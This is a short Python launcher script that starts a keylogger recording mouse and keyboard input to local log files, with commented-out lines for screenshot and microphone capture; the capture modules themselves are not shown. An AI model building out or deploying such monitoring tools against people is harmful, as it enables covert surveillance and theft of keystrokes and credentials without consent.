from keylogger import Keylogger
#from screenshot import Screenshot
#from miclogger import MicLogger


if __name__ == "__main__":
	keylogger = Keylogger("mouse_log.txt", "keyboard_log.txt")
	keylogger.start_listener()
	#screenshot = Screenshot("Screenshots", 5, "screenshot_log.txt")
	#screenshot.start_screenshoting()
	#mic_logger = MicLogger("mic_log.txt")